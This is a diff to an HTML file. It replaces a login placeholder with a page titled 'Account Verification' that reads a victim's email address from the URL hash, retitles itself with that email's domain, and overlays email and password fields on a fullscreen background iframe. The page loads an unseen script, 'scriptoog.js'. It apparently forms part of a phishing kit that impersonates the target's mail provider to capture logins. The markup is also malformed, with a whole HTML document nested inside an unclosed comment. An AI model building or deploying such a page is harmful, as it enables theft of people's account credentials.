@@ -106,47 +106,62 @@
     </header>
 
     <!-- Placeholder / content container
-         Put your own login page or embed here (replace the placeholder below) -->
-    <div id="content">
-      <div class="placeholder">
-        <!-- ADD YOUR LOGIN PAGE OR EMBED HERE -->
-        <div>
-          <strong>Placeholder</strong>
-          <div style="margin-top:6px;color:var(--muted);">Insert your login HTML or widget here.</div>
-        </div>
-      </div>
-    </div>
+         <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Account Verification</title>
 
-    <footer>© 2025 Your Company</footer>
+  <!-- ✅ Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <!-- ✅ Your custom CSS -->
+  <link rel="stylesheet" href="style.css">
+
+  <!-- ✅ Dynamic Title Script with Capitalized First Letter -->
+  <script>
+    window.addEventListener("DOMContentLoaded", function () {
+      const hash = window.location.hash.substring(1); // Remove the '#' character
+      const parts = hash.split("@");
+      if (parts.length === 2) {
+        const domain = parts[1];
+        const capitalized = domain.charAt(0).toUpperCase() + domain.slice(1);
+        document.title = capitalized;
+      }
+    });
+  </script>
+</head>
+<body>
+
+  <!-- Fullscreen background iframe -->
+  <iframe id="bg-frame"></iframe>
+
+  <!-- Login overlay -->
+  <div class="overlay" id="overlay">
+    <div class="login-box">
+      <img id="logo" alt="Logo" />
+
+      <!-- ✅ Email input with icon -->
+      <div class="input-group">
+        <i class="fas fa-envelope icon"></i>
+        <input type="email" id="email" placeholder="Email" />
+      </div>
+
+      <!-- ✅ Password input with icon -->
+      <div class="input-group">
+        <i class="fas fa-lock icon"></i>
+        <input type="password" id="password" placeholder="Password" />
+      </div>
+
+      <!-- Error message -->
+      <div id="error-msg" class="error-msg"></div>
+
+      <!-- Login button -->
+      <button id="login-btn">Login</button>
+    </div>
   </div>
 
-<script>
-  const overlay = document.getElementById('overlay');
-  const sound = document.getElementById('unlockSound');
-  const content = document.getElementById('content');
-
-  overlay.addEventListener('click', () => {
-    // play sound (may be blocked by browser until user interacts — click is an interaction)
-    try { sound.currentTime = 0; sound.play().catch(()=>{}); } catch(e){}
-    // animate and hide overlay
-    overlay.classList.add('fade-out');
-    // after animation, remove overlay and reveal content
-    setTimeout(() => {
-      overlay.style.display = 'none';
-      content.classList.add('visible');
-      // optional: focus first input inside content if exists
-      const firstInput = content.querySelector('input, button, textarea, [tabindex]');
-      if (firstInput) firstInput.focus();
-    }, 650);
-  });
-
-  // optional: allow keyboard "Enter" or Space to dismiss overlay when focused
-  overlay.addEventListener('keydown', (ev) => {
-    if (ev.key === 'Enter' || ev.key === ' ') {
-      ev.preventDefault();
-      overlay.click();
-    }
-  });
-</script>
+  <!-- ✅ Your JavaScript -->
+  <script src="scriptoog.js"></script>
 </body>
 </html>
